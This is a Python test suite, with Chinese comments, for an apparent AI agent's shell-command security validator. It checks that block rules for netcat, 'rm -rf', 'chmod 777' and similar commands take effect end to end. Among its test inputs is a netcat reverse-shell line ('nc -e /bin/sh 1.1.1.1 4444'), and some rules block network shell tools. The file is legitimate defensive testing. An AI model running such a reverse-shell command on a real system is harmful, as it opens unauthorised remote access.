    def test_every_pinned_name_actually_blocks(self, command):
        """钉住的名字集必须与**实际行为**一致：名单里的每个命令都真的被拦。

        这条把「内容值」与「端到端行为」绑在一起 —— 上一条只保证内容没被改，
        这条保证所记内容确实是生效的（防「注册表写了但实现没读」）。
        """
        report = validate_command(command, security_command_settings=_OK)
        assert report.verdict == "block"
        assert "shutdown_reboot" in {rule.rule_id for finding in report.findings for rule in finding.rules}


# 本类守的是核心交付：往 RULE_SPECS 注入一条 pattern 驱动的危险 spec
# 后，新 rule_id 必须真的被发出且行为随之改变。
#
# 断言刻意落在**生产装配路径**（``validate_command``）上，而非直调原语：直调原语
# 只证明原语可用，不证明生产连线存在。注入用 monkeypatch 模块级 ``RULE_SPECS``，
# 使 ``validate_command`` 内部读到扩展后的全集——与平台注入新规则的机制一致。
#
# **可证伪性**：本类的接受判据是「**删掉那条连线会让它变红**」，而非「它现在通过」。
# 故：
#   - 构造期谓词补齐（``build_rule_set`` 对 ``predicate is None`` 者按 pattern
#     派生）若是 NO-OP，``test_new_*`` 会变红（注入的 spec 没有 predicate）；
#   - ``_evaluate_rules`` 若不遍历注入的 ``RULE_SPECS``，全部用例变红。


class TestSpecContentDrivesDecision:
    """加一条 pattern spec → 新 rule_id 真正发出（端到端，经 validate_command）。

    ``RULE_SPECS`` 是 ``MappingProxyType``，用 ``{**RULE_SPECS, ...}`` 展开为新 dict
    后 setattr 是安全的；monkeypatch 会在用例结束后自动还原。
    """

    def _inject(self, monkeypatch, spec):
        """把 spec 注入**模块级** ``RULE_SPECS``（生产路径读的就是它）。

        注入的 spec **不带 predicate**（``RuleSpec(...)`` 缺省 ``predicate=None``）——
        模拟「运行期注入一条未装配谓词的 spec」。该 spec 落在
        ``build_rule_set`` 的 ``merged_specs`` 里，由**构造期谓词补齐**按
        ``pattern`` 派生谓词。若那条补齐被删/被绕过，本类用例全部变红（可证伪性）。
        """
        monkeypatch.setattr(cs, "RULE_SPECS", {**RULE_SPECS, spec.rule_id: spec})

    def test_new_command_names_spec_takes_effect(self, monkeypatch):
        """``Pattern(tokens=(names("nc"),))`` 注入后 ``nc -l 4444`` 从 ``review`` 变 ``block``。

        ``nc`` 不在 RULE_SPECS，若 pattern 派生路径失效，行为仍是 ``review``
        且不会有任何测试变红（静默失效面）。
        """
        assert _verdict_with("nc -l 4444") == "review"  # 基线：未注入时是 review
        self._inject(
            monkeypatch,
            RuleSpec(
                rule_id="nc_block",
                category="remote_exec",
                verdict="block",
                justification="netcat",
                pattern=Pattern(tokens=(names("nc"),)),
            ),
        )
        report = validate_command("nc -l 4444", security_command_settings=_OK)
        assert report.verdict == "block"
        assert "nc_block" in {rule.rule_id for finding in report.findings for rule in finding.rules}

    def test_new_flags_spec_takes_effect(self, monkeypatch):
        """flag 类注入生效：``nc -e ...`` 命中，``nc -l ...`` 不命中。"""
        self._inject(
            monkeypatch,
            RuleSpec(
                rule_id="nc_e",
                category="remote_exec",
                verdict="block",
                justification="nc -e",
                pattern=Pattern(
                    tokens=(
                        "nc",
                        names(
                            "-e",
                        ),
                    )
                ),
            ),
        )
        assert "nc_e" in _rule_ids("nc -e /bin/sh 1.1.1.1 4444")
        assert "nc_e" not in _rule_ids("nc -l 4444")

    def test_new_positional_spec_takes_effect(self, monkeypatch):
        """位置 token 类注入生效：操作数精确相等才命中。"""
        self._inject(
            monkeypatch,
            RuleSpec(
                rule_id="nc_port",
                category="remote_exec",
                verdict="block",
                justification="port",
                pattern=Pattern(
                    tokens=("nc",),
                    positional_index=0,
                    positional_equals=frozenset(
                        {
                            "4444",
                        }
                    ),
                ),
            ),
        )
        assert "nc_port" in _rule_ids("nc -l 4444")
        assert "nc_port" not in _rule_ids("nc -l 5555")

    def test_injection_does_not_change_existing_behavior(self, monkeypatch):
        """反向（防假绿）：注入新 spec **不改变**既有规则的行为。"""
        self._inject(
            monkeypatch,
            RuleSpec(
                rule_id="nc_block",
                category="remote_exec",
                verdict="block",
                justification="netcat",
                pattern=Pattern(tokens=(names("nc"),)),
            ),
        )
        assert _verdict_with("ls") == "allow"
        # ``shred`` 命中 ``shred_file``，且仅此一条（``review`` 不是规则，不产出命中）。
        assert _rule_ids("shred /tmp/x") == {"shred_file"}

    def test_patternless_predicate_less_spec_fails_loud(self):
        """既无谓词、又无可字面化 pattern 的 spec 在**构造期** fail-closed。

        谓词已在构造期定型（``build_rule_set`` 统一补齐）；无法由数据表达
        又无代码谓词的规则会**永不生效**，属加载期错误——不得静默产出。
        这是「代码条件必须自带谓词」在**构造期**的落点（旧实现在派发期回落 ``None``）。
        """
        inert = RuleSpec(
            rule_id="no_predicate", category="remote_exec", verdict="block", justification="x", pattern=None
        )
        with pytest.raises(RuleConfigError, match="永不生效"):
            build_rule_set(_OK, {**RULE_SPECS, "no_predicate": inert}, to_spec=cs._spec_from_declaration)

    def test_pattern_only_spec_gets_predicate_at_construction(self):
        """仅带 pattern（``predicate=None``）的 spec 在构造期被补齐谓词。

        这是「运行期注入一条未装配谓词的 spec」的真实形态：构造期兜底为其补上。
        """
        injected = RuleSpec(
            rule_id="nc_block",
            category="remote_exec",
            verdict="block",
            justification="netcat",
            pattern=Pattern(tokens=(names("nc"),)),
        )
        rule_set = build_rule_set(_OK, {**RULE_SPECS, "nc_block": injected}, to_spec=cs._spec_from_declaration)
        assert rule_set.specs["nc_block"].predicate is not None
        assert rule_set.active_specs["nc_block"].predicate is not None


# ``RuleHit`` / ``RuleContext`` / ``RulePredicate`` 与 ``data_predicate_for``。
# 这些类型住在叶子 ``command_definitions``，故数据模块与注册表都能合法 import。
# 本段只用**真实遍历产物**构造 context（不造假 entry），使「谓词消费 entry」这条
# 链路在测试里也是真的——直调原语的假绿在本仓库有过教训。


class TestRuleInvariantsEntryPoint:
    """``command_rule_validation.assert_rule_invariants`` 是规则全集导入期不变量的**唯一入口**。

    它把分散在四个模块的检查收拢到一处（计数/幂等、谓词非空、双向样例、
    样例与 pattern 自洽、占位符一致性、危险类别归因）。本类证明每条都能单独抓错——
    否则「收拢」只是把散落的检查搬到一个不被验证的聚合点。
    """

    @staticmethod
    def _mutated(rule_id: str = "rm_recursive_force", **overrides):
        return {key: (replace(spec, **overrides) if key == rule_id else spec) for key, spec in RULE_SPECS.items()}

    def test_passes_on_the_real_registry(self):
        _assert_rule_invariants(RULE_SPECS, expected_count=len(RULE_SPECS))

    def test_catches_wrong_count(self):
        with pytest.raises(AssertionError, match="应为"):
            _assert_rule_invariants(dict(list(RULE_SPECS.items())[:-1]), expected_count=len(RULE_SPECS))

    def test_catches_rule_without_predicate(self):
        """缺谓词 = 规则**永不生效**（最危险的静默失效）。"""
        with pytest.raises(AssertionError, match="永不生效"):
            _assert_rule_invariants(self._mutated(predicate=None), expected_count=29)

    def test_catches_missing_double_sided_samples(self):
        """只写 match 是单向自测，守不住判定的边界。"""
        with pytest.raises(AssertionError, match="单向自测无效"):
            _assert_rule_invariants(self._mutated(not_match=()), expected_count=29)

    def test_catches_sample_inconsistent_with_its_pattern(self):
        """样例与 pattern 脱节时（样例成了骗人的注释）必须变红。"""
        with pytest.raises(AssertionError):
            _assert_rule_invariants(self._mutated(match=("ls -la",)), expected_count=29)


class TestRulePredicateVocabulary:
    """统一谓词词汇的可证伪行为。"""

    def _context(self, text: str, pattern, rule_id="r", reason="why", verdict="block", category=None):
        """对 ``text`` 真实遍历后取其首个 entry 构造 context 与谓词。"""
        walked, _ = _walk_source_text(text)
        entry = walked.entries[0]
        predicate = data_predicate_for(pattern, rule_id=rule_id, reason=reason, verdict=verdict, category=category)
        return predicate(RuleContext(walked=walked, entry=entry))

    def test_data_predicate_matches_command_names(self):
        """命令名集合 pattern：命中返回一条 entry 归属 hit，不命中返回空。"""
        hits = self._context("rm -rf /tmp", Pattern(tokens=(names("rm"),)))
        assert len(hits) == 1
        assert hits[0].rule_id == "r" and hits[0].verdict == "block"
        assert hits[0].owner_entry_id == 0 and hits[0].is_structure is False
        assert self._context("ls", Pattern(tokens=(names("rm"),))) == ()

    def test_data_predicate_matches_flags(self):
        """flag alternatives：需与 args 有交集。"""
        assert len(self._context("rm -rf /tmp", Pattern(tokens=("rm", names("-rf", "-r"))))) == 1
        assert self._context("rm /tmp", Pattern(tokens=("rm", names("-rf", "-r")))) == ()

    def test_data_predicate_matches_positional(self):
        """位置 token：操作数精确相等。"""
        assert (
            len(
                self._context(
                    "chmod 777 /tmp/x",
                    Pattern(
                        tokens=("chmod",),
                        positional_index=0,
                        positional_equals=frozenset(
                            {
                                "777",
                            }
                        ),
                    ),
                )
            )
            == 1
        )
        assert (
            self._context(
                "chmod 644 /tmp/x",
                Pattern(
                    tokens=("chmod",),
                    positional_index=0,
                    positional_equals=frozenset(
                        {
                            "777",
                        }
                    ),
                ),
            )
            == ()
        )

    def test_empty_pattern_yields_no_hits(self):
        """``Pattern()``（无内容）恒不产出命中——与「不可字面化」同效。"""
        assert self._context("rm -rf /tmp", None) == ()

    def test_data_predicate_without_entry_yields_no_hits(self):
        """``entry is None``（结构类调用姿态）时数据谓词返回空，不抛异常。"""
        walked, _ = _walk_source_text("rm -rf /tmp")
        predicate = data_predicate_for(Pattern(tokens=(names("rm"),)), rule_id="r", reason="why", verdict="block")
        assert predicate(RuleContext(walked=walked, entry=None)) == ()


class TestRuleHitOwnershipDiscriminator:
    """``RuleHit`` 必须同时表达 entry 归属命中与结构命中（不伪造 entry_id）。"""

    def test_entry_owned_hit(self):
        hit = RuleHit(rule_id="rm_recursive_force", verdict="block", reason="删库", owner_entry_id=3)
        assert hit.owner_entry_id == 3 and hit.is_structure is False

    def test_structure_hit_has_no_owner(self):
        """结构命中用 ``None`` 判别，无需伪造 entry；与 ``CommandStructureFinding`` 字段对齐。"""
        hit = RuleHit(rule_id="syntax:redirect", verdict="block", reason="重定向", category="syntax")
        assert hit.owner_entry_id is None and hit.is_structure is True

    def test_rule_spec_predicate_defaults_to_none(self):
        """``RuleSpec.predicate`` 字段缺省 ``None``；由 ``build_rule_set`` 构造期补齐。

        字段缺省与「构造期保证非空」是两件事：数据类允许未装配（便于按 pattern 声明），
        补齐发生在构造规则视图时——见 ``test_pattern_only_spec_gets_predicate_at_construction``。
        """
        assert RuleSpec(rule_id="r", category="cat", verdict="block", justification="d").predicate is None


# 谓词必须读 ``context.spec`` 的内容，不能读**模块级常量快照**——后者是导入期快照，
# 后果是「改 RULE_SPECS 里那条 spec 的 pattern」完全不生效：运营者以为改掉了规则而
# 它仍在按旧内容判定，是典型的静默失效。
#
# 本类用 `dataclasses.replace` 直接替换 spec 的 pattern（而非新增 spec），断言**行为
# 随 pattern 改变**——缺失这条断言时，两处快照会静默回归。
#
# **可证伪性**：这两条的接受判据是「**把谓词改回读模块级常量会让它变红**」，
# 而非「它通过」。


class TestContentEditChangesBehaviour:
    """改内置 spec 的 ``pattern`` → 判定随之改变（不许读导入期快照）。

    与 ``TestSpecContentDrivesDecision`` 的区别：那类测「**新增** spec」，本类测
    「**改写既有** spec 的内容」。两者覆盖的是不同失效面（前者漏 spec 的谓词装配，
    后者漏谓词的 pattern 读取口径）。
    """

    @staticmethod
    def _replace_content(monkeypatch, rule_id: str, pattern):
        spec = RULE_SPECS[rule_id]
        monkeypatch.setattr(cs, "RULE_SPECS", {**RULE_SPECS, rule_id: replace(spec, pattern=pattern)})

    def test_allowlist_allowed_follows_its_content(self, monkeypatch):
        """把允许列表 pattern 收窄为 ``{pwd}`` → ``ls`` 不再 allow；加回 ``ls`` 又 allow。"""
        assert _verdict_with("ls") == "allow"  # 基线
        self._replace_content(monkeypatch, "allowlist:allowed", Pattern(tokens=(names("pwd"),)))
        assert _verdict_with("ls") != "allow"  # 改内容后不再放行（读模块级快照的写法此处仍是 allow）
        self._replace_content(monkeypatch, "allowlist:allowed", Pattern(tokens=(names("pwd", "ls"),)))
        assert _verdict_with("ls") == "allow"  # 加回即恢复

    def test_forbidden_command_follows_its_content(self, monkeypatch):
        """把禁用集合换成 ``{kill}`` → ``kill`` 被拦、``nohup`` 不再被拦（双向）。"""
        assert "syntax:forbidden_command" in _rule_ids("nohup x")  # 基线
        self._replace_content(monkeypatch, "syntax:forbidden_command", Pattern(tokens=(names("kill"),)))
        assert "syntax:forbidden_command" in _rule_ids("kill 1")
        assert "syntax:forbidden_command" not in _rule_ids("nohup x")


# ========== 声明 → 形状通道（平台下发） ==========


#: 内置规则的 ``pattern`` 真源（``rule_id -> Pattern``）；对标断言从此处取，
#: **不手抄** —— 手抄的形状会在内置规则演化时静默漂移。
_BUILTIN_PATTERNS = {spec.rule_id: spec.pattern for spec in BLOCKLIST_RULES if spec.pattern is not None}


def _declaration(**modifiers):
    """构造一条最小合法的平台声明（只带形状字段）。"""

    return RuleSpecConfig(
        rule_id=f"custom:{modifiers.pop('_rule_id', 'x')}",
        verdict=modifiers.pop("_verdict", "block"),
        justification="x",
        **modifiers,
    )


def _run_predicate(spec, command: str):
    """在**真实解析路径**上跑一条 spec 的数据谓词，返回命中的 :class:`RuleHit` 序列。

    用真解析而非鸭子类型替身：``_spec_from_declaration`` 的 ``name_of`` / ``args_of``
    走 ``effective_command_name`` / ``effective_command_args``，后者要求真
    ``CommandEntry``（合成替身会让名字归一化返回 ``None`` → 恒不命中，
    那是**测试写法**造成的假阴性）。
    """
    source = CommandSource(0, None, None, command)
    walked = cp.WalkResult(source=source)
    limits = {"max_command_length": 100000, "max_nodes": 100000, "max_depth": 100, "max_reparse_depth": 8}
    cp.walk_nodes(bashlex.parse(command), source=source, budget=cp.WalkBudget(**limits), result=walked)
    context = RuleContext(walked=walked, entry=walked.entries[0], spec=spec)
    predicate = spec.predicate
    if predicate is None:  # pragma: no cover - 调用方已断言非 None
        return ()
    return tuple(predicate(context))


class TestPatternMappingKeepsLeafBoundary:
    """本模块是**依赖叶子**：模块级 import 只能是标准库 + 上游基础层（``pydantic_models``）。

    不得引**第三方**（``pydantic`` / ``bashlex``）或**同包兄弟**模块。
    """

    def test_no_new_imports_in_base_module(self):
        """可证伪的叶子约束：模块级 import 无第三方、无同包兄弟。

        为什么是「按来源判定」而不是「恰好 N 条」：条数会随内容增减而变
        （文案段并入即多一条 ``import string``），钉条数只会制造无意义的假红；
        叶子性由「来源」判定，与被 import 的名字多少无关。

        **``aidev_agent.pydantic_models`` 是允许的**：依赖方向 ``packages/security``
        → ``pydantic_models`` 是正向（``command_approval`` / ``command_security``
        同样在模块级 import ``SecurityCommandSettings``），不成环——``pydantic_models``
        不 import 本包。故它**不属于**「第三方」或「同包兄弟」。
        """
        source_path = (
            pathlib.Path(__file__).resolve().parents[4] / "aidev_agent/packages/security/command/command_definitions.py"
        )
        tree = ast.parse(source_path.read_text(encoding="utf-8"))
        imported_modules = {n.module or "" for n in tree.body if isinstance(n, ast.ImportFrom)} | {
            alias.name for n in tree.body if isinstance(n, ast.Import) for alias in n.names
        }
        # 不得引**第三方**：顶层包名为 ``pydantic`` / ``bashlex`` 者。
        # ⚠ 精确判定顶层包名，不能用子串——``aidev_agent.pydantic_models`` 含
        # "pydantic" 子串但它是**上游自家模块**，子串匹配会误伤它。
        third_party = {name for name in imported_modules if name.split(".")[0] in {"pydantic", "bashlex"}}
        assert not third_party, f"叶子模块不得 import 第三方包：{sorted(third_party)}"
        # 不得引同包兄弟模块（相对 import 的 level>=1 或绝对路径含 command.）。
        sibling_imports = [
            n
            for n in tree.body
            if isinstance(n, ast.ImportFrom) and (n.level >= 1 or "security.command" in (n.module or ""))
        ]
        assert sibling_imports == [], f"叶子模块不得 import 同包兄弟：{[n.lineno for n in sibling_imports]}"

    def test_from_mapping_has_no_own_shape_guard(self):
        """可证伪：``from_mapping`` 方法体内**无** ``raise``（拒收责任不外移）。"""
        source_path = (
            pathlib.Path(__file__).resolve().parents[4] / "aidev_agent/packages/security/command/command_definitions.py"
        )
        tree = ast.parse(source_path.read_text(encoding="utf-8"))
        pattern_cls = next(n for n in tree.body if isinstance(n, ast.ClassDef) and n.name == "Pattern")
        method = next(n for n in pattern_cls.body if isinstance(n, ast.FunctionDef) and n.name == "from_mapping")
        raises = [n for n in ast.walk(method) if isinstance(n, ast.Raise)]
        assert raises == []


class TestDeclarationToPattern:
    """``_spec_from_declaration`` 复用 ``Pattern.from_mapping``，不自己造形状。"""

    def test_skip_flags_is_frozenset_of_str(self):
        """``skip_flags=['-y']`` → ``frozenset({'-y'})``，不是 ``True`` / ``list``。"""
        spec = cs._spec_from_declaration(_declaration(tokens=["apt"], positional_index=0, skip_flags=["-y"]))
        assert spec.pattern.skip_flags == frozenset({"-y"})
        assert isinstance(spec.pattern.skip_flags, frozenset)

    @pytest.mark.parametrize(
        ("rule_id", "declaration_kwargs"),
        [
            # ⚠ tokens 顺序按 **实测** 的内置 pattern 写死（``from_mapping`` 不排序）。
            #    ``package_install`` / ``firewall_change`` 的内置形态是**单个
            #    alternatives token**（``(names(...),)``），故 ``to_mapping`` 产出的
            #    tokens 是 ``[['apt','apt-get','conda','dnf','yum']]``——
            #    逐字段 ``==`` 要求声明侧给出**同样的 alternatives 形状**，
            #    而非把名字集合摊平成有序的多个 token。这是「形状真的能搬过去」的
            #    唯一证据（扁平化会得到与内置不同的 tokens）。
            ("chmod_777", {"tokens": ["chmod"], "positional_index": 0, "positional_equals": ["777"]}),
            (
                "chown_root",
                {"tokens": ["chown"], "positional_index": 0, "positional_equals": ["root"], "strip_colon": True},
            ),
            (
                "package_install",
                {
                    "tokens": [["apt", "apt-get", "conda", "dnf", "yum"]],
                    "positional_index": 0,
                    # 内置 positional_equals / skip_flags 是 **frozenset**，顺序无关。
                    "positional_equals": ["install", "remove", "uninstall", "update", "upgrade"],
                    "skip_flags": ["--quiet", "-q", "--yes", "-y"],
                },
            ),
            (
                "firewall_change",
                {"tokens": [["iptables", "ufw"]], "requires_any_flag": True},
            ),
        ],
        ids=["chmod_777", "chown_root", "package_install", "firewall_change"],
    )
    def test_platform_can_reproduce_builtin_patterns(self, rule_id, declaration_kwargs):
        """四条内置规则的「平台复现不出来」形态，声明侧逐字段可复现。"""
        spec = cs._spec_from_declaration(_declaration(_rule_id=rule_id, **declaration_kwargs))
        assert spec.pattern == _BUILTIN_PATTERNS[rule_id]

    def test_verdict_is_not_swapped_for_allow_declaration(self):
        """声明为 ``allow`` 时 ``verdict`` 必须原样落到 ``RuleHit``。

        ``test_platform_can_reproduce_builtin_patterns`` 的声明全是 ``verdict='block'``，
        无法证伪「装配点把 ``declaration.verdict`` 硬编码成 ``'block'``」——本用例用
        ``allow`` 声明专门钉住它。

        走真实解析路径（``effective_command_name`` 只认真 ``CommandEntry``），
        命中后直接读 ``RuleHit.verdict``。
        """
        spec = cs._spec_from_declaration(_declaration(tokens=["nc"], _verdict="allow"))
        assert spec.verdict == "allow"
        assert spec.pattern is not None
        assert spec.predicate is not None
        hits = _run_predicate(spec, "nc -l 8080")
        assert hits, "谓词应在命中时产出 RuleHit"
        assert all(hit.verdict == "allow" for hit in hits)


class TestNoSecondLiteralizablePredicate:
    """第二套准入判据不得存在（同一条判据只能有一份实现）的源码结构守卫。"""

    def test_no_bool_skip_flags_in_declaration_assembler(self):
        """装配点不得再把 ``True`` 传进 ``skip_flags`` 语义。"""
        source = (
            pathlib.Path(__file__).resolve().parents[4] / "aidev_agent/packages/security/command/command_security.py"
        ).read_text(encoding="utf-8")
        assert "skip_flags=True" not in source

    def test_no_legacy_tokens_only_predicate(self):
        """第二套准入判据不得存在（同一条判据只能有一份实现）。"""
        source = (
            pathlib.Path(__file__).resolve().parents[4] / "aidev_agent/packages/security/command/command_definitions.py"
        ).read_text(encoding="utf-8")
        assert "_tokens_are_literalizable" not in source

    def test_declaration_assembler_reuses_from_mapping(self):
        """装配点必须**复用**形状层的反序列化接口，不自己造形状。

        用 AST 检查 ``_spec_from_declaration`` 的**代码**（不看 docstring——
        后者会引用这些名字，纯文本 grep 会误命中）。
        """
        source_path = (
            pathlib.Path(__file__).resolve().parents[4] / "aidev_agent/packages/security/command/command_security.py"
        )
        source = source_path.read_text(encoding="utf-8")
        tree = ast.parse(source)
        func = next(n for n in ast.walk(tree) if isinstance(n, ast.FunctionDef) and n.name == "_spec_from_declaration")
        # 函数体内是否有对 ``Pattern.from_mapping`` 的调用？
        uses_from_mapping = any(
            isinstance(node, ast.Call)
            and isinstance(node.func, ast.Attribute)
            and node.func.attr == "from_mapping"
            and isinstance(node.func.value, ast.Name)
            and node.func.value.id == "Pattern"
            for node in ast.walk(func)
        )
        assert uses_from_mapping, "装配点必须经 Pattern.from_mapping 搬运形状"
        # 且不得再有直接构造 ``Pattern(tokens=...)``：检查函数体内所有 ``Pattern(...)`` 调用
        direct_pattern_calls = [
            node
            for node in ast.walk(func)
            if isinstance(node, ast.Call) and isinstance(node.func, ast.Name) and node.func.id == "Pattern"
        ]
        assert direct_pattern_calls == [], f"不得直接构造 Pattern（应走 from_mapping）：{direct_pattern_calls}"


class TestAdmissionCoversAllModifierDimensions:
    """准入判据覆盖全部修饰符维度，且非法形状归一为 ``RuleConfigError``。"""

    def test_invalid_modifier_combo_is_rejected_as_rule_config_error(self):
        """``tokens`` 合法但修饰符非法 → ``RuleConfigError``（fail-closed），不静默降级。

        ``tokens=['chmod']`` + ``positional_equals=['777']`` 而 ``positional_index`` 缺省：
        只看 ``tokens`` 的准入判据会放行它；随后 ``Pattern.__post_init__`` 抛
        ``ValueError``。本判据让准入阶段就拒收，且归因为平台配置错。

        ⚠ **断言必须区分「哪一层拒的」**：``build_rule_set`` 里有**两道**防线都可能
        抛 ``RuleConfigError``——(a) 准入判据 ``_declaration_is_literalizable``，
        (b) 装配点的 ``to_spec`` 归一化。若只断言 ``pytest.raises(RuleConfigError)``，
        那么把准入判据退回「只看 tokens」的行为后 (b) 仍会兜住，测试**保持全绿**。
        故此处直接判**准入判据本身**的返回值，并把 message 断言钉在准入文案上——
        这样「准入层拦下了它」才可证伪。
        """

        settings = SecurityCommandSettings(
            rules=[
                {
                    "rule_id": "custom:bad_combo",
                    "verdict": "block",
                    "justification": "x",
                    "tokens": ["chmod"],
                    "positional_equals": ["777"],  # positional_index 缺省 → 组合无意义
                }
            ]
        )
        declaration = settings.rules[0]
        # (a) 准入判据本身必须判否 —— 这是「准入层真的拦下了它」的可证伪面
        assert _declaration_is_literalizable(declaration) is False
        # (b) 端到端：整体 fail-closed，且 message 是准入判据的文案
        with pytest.raises(RuleConfigError, match="不可字面化"):
            build_rule_set(settings, RULE_SPECS, to_spec=cs._spec_from_declaration)

    def test_valid_modifier_combo_still_passes_admission(self):
        """对照：合法的修饰符组合必须照常通过（准入不是「一律拒收」）。"""
        settings = SecurityCommandSettings(
            rules=[
                {
                    "rule_id": "custom:good_combo",
                    "verdict": "block",
                    "justification": "x",
                    "tokens": ["chmod"],
                    "positional_index": 0,
                    "positional_equals": ["777"],
                }
            ]
        )
        rule_set = build_rule_set(settings, RULE_SPECS, to_spec=cs._spec_from_declaration)
        assert rule_set.specs["custom:good_combo"].pattern == Pattern(
            tokens=("chmod",), positional_index=0, positional_equals=frozenset({"777"})
        )


#: 开关词汇：不得出现在 ``_evaluate_rules`` 体内。
#:
#: 纯行为测试（经 ``validate_command`` 拨开关）**无法**区分「评估期过滤」与「构造期过滤」
#: ——两种实现的报告逐字节相同，是记录在案的假绿陷阱。故这里用 AST 形状断言钉住
#: 「过滤在构造期、评估层零开关知识」这一**结构**契约。
_SWITCH_VOCABULARY = frozenset(
    {
        "enable_command_blocklist",
        "enable_command_blocklist_dynamic_exec",
        "enable_command_blocklist_unsupported",
        "enable_command_syntax_rules",
        "_PER_RULE_GATES",
        "SYNTAX_RULE_IDS",
        "BLOCKLIST_CATEGORIES",
    }
)

#: 其中**直接**由 ``_active_specs`` 引用的名字。
#:
#: 两个逐条开关名（``..._dynamic_exec`` / ``..._unsupported``）**不在此集**：
#: 它们住在 ``_PER_RULE_GATES`` 的 lambda 体里（模块级定义），``_active_specs``
#: 只引用映射名 ``_PER_RULE_GATES``，故反向自证只要求这 5 个直接名字。
_DIRECT_SWITCH_NAMES = frozenset(
    {
        "enable_command_blocklist",
        "enable_command_syntax_rules",
        "_PER_RULE_GATES",
        "SYNTAX_RULE_IDS",
        "BLOCKLIST_CATEGORIES",
    }
)


def _function_body_names(tree: ast.Module, func_name: str) -> set[str]:
    """收集某个顶层函数体内出现的**全部** ``Name.id`` / ``Attribute.attr``。

    只取 ``FunctionDef`` 节点自身的子树（不越出函数边界），故同名局部/全局都会命中。
    """
    for node in tree.body:
        if isinstance(node, ast.FunctionDef) and node.name == func_name:
            names: set[str] = set()
            for sub in ast.walk(node):
                if isinstance(sub, ast.Name):
                    names.add(sub.id)
                elif isinstance(sub, ast.Attribute):
                    names.add(sub.attr)
            return names
    raise AssertionError(f"{func_name} 未在模块顶层定义——测试自身失效")


class TestSwitchFilteringHappensAtConstruction:
    """开关过滤必须住在构造期（``_active_specs``），评估层 ``_evaluate_rules`` 零开关知识。

    本类是对「把三条闸门搬出评估循环」这一重构的**结构护栏**：若有人把 ``continue``
    判据加回 ``_evaluate_rules``，``test_evaluate_rules_has_no_switch_knowledge`` 变红。
    反向断言 ``test_filter_helper_actually_owns_the_switches`` 则防「判据被删而非搬迁」。
    """

    def test_evaluate_rules_has_no_switch_knowledge(self):
        """``_evaluate_rules`` 体内不得出现任何开关词汇。

        可证伪：把任一 ``if not settings.enable_command_blocklist ...: continue``
        加回该函数即变红。
        """
        names = _function_body_names(_parse_module(_AGGREGATION_MODULE), "_evaluate_rules")
        offenders = sorted(names & _SWITCH_VOCABULARY)
        assert offenders == [], (
            f"_evaluate_rules 体内出现开关词汇 {offenders}——评估层应只遍历已过滤的 "
            f"active_specs，开关过滤属构造期（_active_specs）。"
        )

    def test_filter_helper_actually_owns_the_switches(self):
        """反向自证：``_active_specs`` 体内**确实**出现这些开关词汇（判据是搬迁，不是删除）。"""
        names = _function_body_names(_parse_module(_AGGREGATION_MODULE), "_active_specs")
        missing = sorted(_DIRECT_SWITCH_NAMES - names)
        assert missing == [], f"_active_specs 体内缺少开关词汇 {missing}——过滤判据可能被误删而非搬迁。"

    def test_evaluate_rules_iterates_active_specs(self):
        """``_evaluate_rules`` 遍历的是 ``active_specs``，不是 ``specs``。"""
        names = _function_body_names(_parse_module(_AGGREGATION_MODULE), "_evaluate_rules")
        assert "active_specs" in names, "_evaluate_rules 应遍历 rule_set.active_specs"
